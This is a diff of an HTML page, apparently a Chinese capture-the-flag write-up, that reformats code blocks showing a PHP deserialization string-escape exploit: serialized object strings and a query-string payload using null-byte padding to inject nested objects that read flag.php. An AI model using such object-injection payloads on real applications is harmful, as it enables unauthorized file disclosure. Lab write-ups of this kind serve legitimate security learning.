@@ -227,10 +227,8 @@
 
 b=s&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></pre><p>先随意传a=1,b=2</p>
 <pre><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;2&quot;;}</code></pre><p>所以我们的弄进去之后</p>
-<pre><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:74:&quot;s&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:
-{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;;}</code></pre><p>我们需要让1”;s:8:”password”;s:74:”s被逃逸掉，后面这正好是24个，24/3=8，所以前面需要8个/0/0/0，所以payload为：</p>
-<pre><code>?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=s&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:
-{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></pre>
+<pre><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:74:&quot;s&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;;}</code></pre><p>我们需要让1”;s:8:”password”;s:74:”s被逃逸掉，后面这正好是24个，24/3=8，所以前面需要8个/0/0/0，所以payload为：</p>
+<pre><code>?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=s&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></pre>
             </div>
 
             <!-- Post Comments -->
